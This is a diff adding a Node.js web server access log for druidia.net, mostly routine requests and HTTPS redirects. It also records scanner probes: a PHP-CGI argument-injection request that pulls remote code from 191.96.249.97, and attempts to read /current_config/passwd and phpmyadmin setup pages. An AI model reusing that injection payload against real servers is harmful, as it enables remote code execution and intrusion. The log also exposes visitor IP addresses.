@@ -1,0 +1,168 @@
+2017-03-27T21:11:06.064Z - info: Log files will be located in:logs
+2017-03-27T21:11:06.080Z - info: node /home/kcenturion/Documents/dev/druidia/app-server/ind:Using config file:
+{"title":"druidia.net","hostname":"druidia.net","debugMobile":true,"port":443,"httpPort":80,"logger":{"enabled":true,"dir":"logs"},"mySqlServer":{"host":"","port":""},"mongo":{"connectionString":"mongodb://localhost/druidia","keepAlive":300000},"messages":{"notFoundMessage":"404 Error. Page not found."}}
+2017-03-27T21:11:06.082Z - info: node /home/kcenturion/Documents/dev/druidia/app-server/ind:Setting default and config values for express app.
+2017-03-27T21:11:06.132Z - info: node /home/kcenturion/Documents/dev/druidia/app-server/ind:Defined mongo session store with credentials.
+2017-03-27T21:11:06.140Z - info: node /home/kcenturion/Documents/dev/druidia/app-server/ind:Setting static file directory.
+2017-03-27T21:11:06.141Z - info: node /home/kcenturion/Documents/dev/druidia/app-server/ind:Defining routing file.
+2017-03-27T21:11:06.178Z - info: druidia.net:druidia.net server now listening on port:443
+2017-03-27T21:11:06.179Z - info: druidia.net:druidia.net server now listening on port:80
+2017-03-27T21:11:06.195Z - info: druidia.net:Mongoose default connection open to mongodb://localhost/druidia
+2017-03-27T21:14:18.760Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:14:18.761Z - info: druidia.net:Sending index to client.
+2017-03-27T21:14:21.044Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:14:21.045Z - info: druidia.net:Sending index to client.
+2017-03-27T21:17:38.496Z - info: druidia.net:GET request to:/admin/i18n/readme.txt made by IP Address: ::ffff:185.102.218.60
+2017-03-27T21:17:48.755Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:17:48.756Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/
+2017-03-27T21:17:48.874Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:17:48.874Z - info: druidia.net:Sending index to client.
+2017-03-27T21:18:07.909Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:18:07.910Z - info: druidia.net:Sending index to client.
+2017-03-27T21:18:11.886Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-27T21:18:11.887Z - info: druidia.net:Sending index to client.
+2017-03-27T21:24:13.708Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:173.51.222.123
+2017-03-27T21:24:13.709Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-27T21:56:08.755Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:118.174.60.196
+2017-03-27T21:56:08.755Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-27T23:04:14.441Z - info: druidia.net:GET request to:/admin/i18n/readme.txt made by IP Address: ::ffff:185.76.10.33
+2017-03-28T00:08:03.970Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:27.145.10.236
+2017-03-28T00:08:03.971Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-28T03:17:56.938Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:207.195.19.6
+2017-03-28T03:17:56.938Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T03:27:01.514Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:72.190.24.67
+2017-03-28T03:27:01.514Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/
+2017-03-28T03:27:01.625Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:72.190.24.67
+2017-03-28T03:27:01.626Z - info: druidia.net:Sending index to client.
+2017-03-28T03:27:02.201Z - info: druidia.net:GET request to:/favicon.ico made by IP Address: ::ffff:72.190.24.67
+2017-03-28T04:41:26.047Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:213.195.217.27
+2017-03-28T04:41:26.048Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T06:22:18.949Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:54.193.61.75
+2017-03-28T06:22:18.949Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-28T08:20:30.665Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:74.5.188.20
+2017-03-28T08:20:30.665Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T08:57:00.887Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:187.235.102.139
+2017-03-28T08:57:00.887Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T09:08:00.251Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:196.52.43.61
+2017-03-28T09:08:00.252Z - warn: druidia.net:Request not secure. Redirecting to secure site:cpe-72-190-24-67.tx.res.rr.com/
+2017-03-28T14:51:52.355Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:97.65.42.8
+2017-03-28T14:51:52.355Z - info: druidia.net:Sending index to client.
+2017-03-28T14:51:54.104Z - info: druidia.net:GET request to:/favicon.ico made by IP Address: ::ffff:97.65.42.8
+2017-03-28T16:09:55.099Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:5.188.211.68
+2017-03-28T16:09:55.099Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T16:54:01.157Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:2.84.147.221
+2017-03-28T16:54:01.158Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T17:20:02.602Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:203.151.232.12
+2017-03-28T17:20:02.602Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T18:39:43.637Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:101.108.232.144
+2017-03-28T18:39:43.638Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-28T21:50:39.581Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:185.110.132.232
+2017-03-28T21:50:39.581Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-28T22:51:44.788Z - info: druidia.net:GET request to:/admin/i18n/readme.txt made by IP Address: ::ffff:185.102.218.60
+2017-03-29T00:35:59.006Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:220.133.251.25
+2017-03-29T00:35:59.006Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T02:05:43.187Z - info: druidia.net:GET request to:/current_config/passwd made by IP Address: ::ffff:183.129.160.229
+2017-03-29T02:05:43.188Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/current_config/passwd
+2017-03-29T02:05:43.366Z - info: druidia.net:GET request to:/current_config/Account1 made by IP Address: ::ffff:183.129.160.229
+2017-03-29T02:05:43.366Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/current_config/Account1
+2017-03-29T06:19:27.097Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:172.9.229.118
+2017-03-29T06:19:27.097Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T10:19:02.841Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:139.162.185.69
+2017-03-29T10:19:02.843Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T12:09:25.936Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:139.162.119.197
+2017-03-29T12:09:25.937Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-29T12:54:55.760Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:195.198.85.10
+2017-03-29T12:54:55.761Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T13:26:17.103Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:76.29.100.212
+2017-03-29T13:26:17.103Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T14:58:15.250Z - info: druidia.net:GET request to:/robots.txt made by IP Address: ::ffff:207.46.13.228
+2017-03-29T14:58:15.250Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/robots.txt
+2017-03-29T15:05:20.566Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:40.77.167.8
+2017-03-29T15:05:20.566Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/
+2017-03-29T15:51:55.712Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:42.200.163.83
+2017-03-29T15:51:55.712Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T16:41:20.518Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:139.162.116.133
+2017-03-29T16:41:20.519Z - info: druidia.net:Sending index to client.
+2017-03-29T18:17:12.799Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:196.52.43.52
+2017-03-29T18:17:12.800Z - info: druidia.net:Sending index to client.
+2017-03-29T18:21:44.634Z - info: druidia.net:HEAD request to:http://180.163.113.82/check_proxy made by IP Address: ::ffff:180.97.106.37
+2017-03-29T18:21:44.634Z - warn: druidia.net:Request not secure. Redirecting to secure site:180.163.113.82http://180.163.113.82/check_proxy
+2017-03-29T18:45:10.575Z - info: druidia.net:GET request to:/robots.txt made by IP Address: ::ffff:207.46.13.234
+2017-03-29T18:45:10.961Z - info: druidia.net:GET request to:/robots.txt made by IP Address: ::ffff:207.46.13.234
+2017-03-29T20:41:45.120Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:169.54.244.89
+2017-03-29T20:41:45.120Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-29T21:36:27.482Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:54.193.18.14
+2017-03-29T21:36:27.482Z - info: druidia.net:Sending index to client.
+2017-03-29T22:10:37.748Z - info: druidia.net:GET request to:/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n made by IP Address: ::ffff:191.96.249.97
+2017-03-29T22:10:37.749Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/cgi-bin/php?-d+allow_url_include%3Don+-d+safe_mode%3Doff+-d+suhosin.simulation%3Don+-d+max_execution_time%3D0+-d+disable_functions%3D""+-d+open_basedir%3Dnone+-d+auto_prepend_file%3Dhttp://191.96.249.97/ok.txt+-d+cgi.force_redirect%3D0+-d+cgi.redirect_status_env%3D0+-n
+2017-03-29T23:46:00.413Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:207.46.13.179
+2017-03-29T23:46:00.413Z - info: druidia.net:Sending index to client.
+2017-03-30T01:01:03.126Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:54.245.175.167
+2017-03-30T01:01:03.157Z - info: druidia.net:Sending index to client.
+2017-03-30T01:09:56.404Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:185.169.230.8
+2017-03-30T01:09:56.406Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T02:48:01.707Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:212.129.25.214
+2017-03-30T02:48:01.707Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T04:20:33.850Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:220.130.178.121
+2017-03-30T04:20:33.851Z - info: druidia.net:Sending index to client.
+2017-03-30T05:39:24.037Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:157.55.39.199
+2017-03-30T05:39:24.037Z - info: druidia.net:Sending index to client.
+2017-03-30T06:39:30.657Z - info: druidia.net:GET request to:/cgi/common.cgi made by IP Address: ::ffff:189.100.120.12
+2017-03-30T06:39:30.659Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/cgi/common.cgi
+2017-03-30T06:39:31.037Z - info: druidia.net:GET request to:/stssys.htm made by IP Address: ::ffff:189.100.120.12
+2017-03-30T06:39:31.038Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/stssys.htm
+2017-03-30T06:39:31.385Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:189.100.120.12
+2017-03-30T06:39:31.386Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-30T06:39:32.032Z - info: druidia.net:POST request to:/command.php made by IP Address: ::ffff:189.100.120.12
+2017-03-30T06:39:32.032Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/command.php
+2017-03-30T06:41:52.944Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:185.169.230.8
+2017-03-30T06:41:52.944Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T07:56:27.919Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:77.167.219.243
+2017-03-30T07:56:27.920Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T08:27:17.481Z - info: druidia.net:GET request to:/phpmyadmin/scripts/setup.php made by IP Address: ::ffff:191.96.249.97
+2017-03-30T08:27:17.481Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/phpmyadmin/scripts/setup.php
+2017-03-30T08:30:05.764Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:184.105.247.196
+2017-03-30T08:30:05.764Z - info: druidia.net:Sending index to client.
+2017-03-30T09:09:41.768Z - info: druidia.net:GET request to:/robots.txt made by IP Address: undefined
+2017-03-30T09:11:43.488Z - info: druidia.net:GET request to:/current_config/Account1 made by IP Address: ::ffff:60.191.38.78
+2017-03-30T09:11:43.488Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/current_config/Account1
+2017-03-30T09:11:43.546Z - info: druidia.net:GET request to:/current_config/passwd made by IP Address: ::ffff:60.191.38.78
+2017-03-30T09:11:43.546Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/current_config/passwd
+2017-03-30T12:11:52.500Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:185.169.230.8
+2017-03-30T12:11:52.503Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T12:54:44.822Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:139.162.116.133
+2017-03-30T12:54:44.832Z - info: druidia.net:Sending index to client.
+2017-03-30T13:50:48.844Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:125.64.94.200
+2017-03-30T13:50:48.845Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T14:07:19.829Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:157.55.39.198
+2017-03-30T14:07:19.831Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/
+2017-03-30T14:55:06.083Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:125.64.94.200
+2017-03-30T14:55:06.084Z - info: druidia.net:Sending index to client.
+2017-03-30T16:33:50.624Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:139.162.114.70
+2017-03-30T16:33:50.626Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-30T16:53:51.055Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:73.210.50.251
+2017-03-30T16:53:51.056Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T17:44:42.375Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:207.46.13.121
+2017-03-30T17:44:42.375Z - info: druidia.net:Sending index to client.
+2017-03-30T18:06:00.993Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:112.205.113.236
+2017-03-30T18:06:00.994Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T18:09:45.122Z - info: druidia.net:GET request to:/admin/i18n/readme.txt made by IP Address: ::ffff:185.102.218.60
+2017-03-30T19:35:49.023Z - info: druidia.net:GET request to:http://www.ifeng.com/ made by IP Address: ::ffff:122.200.65.19
+2017-03-30T19:35:49.024Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.ifeng.comhttp://www.ifeng.com/
+2017-03-30T21:56:16.112Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:5.2.149.114
+2017-03-30T21:56:16.113Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T22:56:57.306Z - info: druidia.net:POST request to:/ made by IP Address: ::ffff:110.90.95.163
+2017-03-30T22:56:57.306Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-30T23:05:11.414Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:178.191.59.42
+2017-03-30T23:05:11.415Z - warn: druidia.net:Request not secure. Redirecting to secure site:undefined/
+2017-03-30T23:05:21.990Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:195.154.182.232
+2017-03-30T23:05:21.991Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-30T23:05:22.543Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:195.154.182.232
+2017-03-30T23:05:22.544Z - info: druidia.net:Sending index to client.
+2017-03-31T01:38:58.365Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:185.110.132.232
+2017-03-31T01:38:58.366Z - warn: druidia.net:Request not secure. Redirecting to secure site:72.190.24.67/
+2017-03-31T01:59:11.295Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:72.190.24.67
+2017-03-31T01:59:11.295Z - info: druidia.net:Sending index to client.
+2017-03-31T01:59:11.740Z - info: druidia.net:GET request to:/favicon.ico made by IP Address: ::ffff:72.190.24.67
+2017-03-31T03:00:39.344Z - info: druidia.net:GET request to:/ made by IP Address: ::ffff:157.55.39.198
+2017-03-31T03:00:39.344Z - warn: druidia.net:Request not secure. Redirecting to secure site:www.druidia.net/
